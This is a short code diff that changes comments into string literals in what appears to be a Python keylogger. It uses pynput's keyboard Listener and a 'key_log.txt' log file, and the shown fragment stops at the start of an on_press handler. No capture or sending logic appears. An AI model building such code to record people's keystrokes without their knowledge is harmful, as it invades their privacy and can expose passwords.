@@ -1,17 +1,15 @@
-# Modules
+"""Modules"""
 from pynput.keyboard import Key, Listener
 from colorama import Fore
 
-# Global variables
-
+"""Global variables"""
 keys_information = "key_log.txt"
 
 count = 0 
 
 keys = []
 
-# Functions
-
+"""Functions"""
 def on_press(key):
     global count , keys
     
